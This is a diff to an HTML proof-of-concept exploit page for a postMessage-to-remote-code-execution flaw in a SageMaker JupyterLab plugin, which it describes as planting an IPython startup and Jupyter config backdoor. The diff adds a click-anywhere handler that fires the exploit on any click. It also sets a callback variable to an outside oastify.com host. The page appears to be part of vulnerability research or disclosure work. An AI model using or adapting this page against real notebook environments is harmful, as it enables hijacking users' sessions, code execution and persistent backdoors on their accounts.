@@ -3,31 +3,36 @@
 <head>
   <title>Finding 4 — postMessage RCE PoC</title>
   <style>
-    body { font-family: monospace; background: #0a0a0a; color: #c0c0c0; padding: 30px; }
-    h1 { color: #ff4444; font-size: 18px; }
-    label { display: block; color: #888; font-size: 12px; margin-top: 10px; }
-    input { width: 100%; background: #1a1a1a; border: 1px solid #444; color: #e0e0e0;
+    body { font-family: monospace; background: #ffffff; color: #1a1a2e; padding: 30px; cursor: pointer; }
+    h1 { color: #1565c0; font-size: 18px; }
+    label { display: block; color: #5a5a7a; font-size: 12px; margin-top: 10px; }
+    input { width: 100%; background: #f0f4ff; border: 1px solid #90b0e0; color: #1a1a2e;
             padding: 8px; font-family: monospace; font-size: 13px; margin-top: 4px; }
-    button { background: #ff4444; color: #fff; border: none; padding: 10px 25px;
+    button { background: #1565c0; color: #fff; border: none; padding: 10px 25px;
              font-family: monospace; font-size: 14px; cursor: pointer; margin-top: 15px; }
     #status { margin-top: 15px; font-size: 13px; }
-    .ok { color: #44ff44; } .err { color: #ff4444; } .warn { color: #ffaa00; }
+    .ok { color: #2e7d32; } .err { color: #c62828; } .warn { color: #e65100; }
   </style>
 </head>
 <body>
-  <h1>CVE PoC: postMessage → RCE (Finding 4)</h1>
-  <p style="color:#666;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → IPython startup + Jupyter config backdoor</p>
+  <h1>PoC: postMessage → RCE SageMaker DataZone/Unified Studio</h1>
+  <p style="color:#5a5a7a;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → IPython startup + Jupyter config backdoor</p>
 
   <label>Target JupyterLab URL:</label>
   <input id="url" value="https://XXXXX.studio.us-east-2.sagemaker.aws/jupyterlab/default/lab" />
   <label>Wait for Studio to load (ms):</label>
   <input id="wait" value="8000" />
 
-  <button onclick="exploit()">Launch Exploit</button>
+  <button id="launchBtn">Click Anywhere To Launch Exploit</button>
   <div id="status"></div>
 
 <script>
 var CALLBACK = '2nqdaq56ymdtf45fbkjtbga9w02rqje8.oastify.com';
+var launched = false;
+document.addEventListener('click', function(e) {
+  if (e.target.tagName === 'INPUT') return;
+  if (!launched) { launched = true; exploit(); }
+});
 
 function status(msg, cls) {
   document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
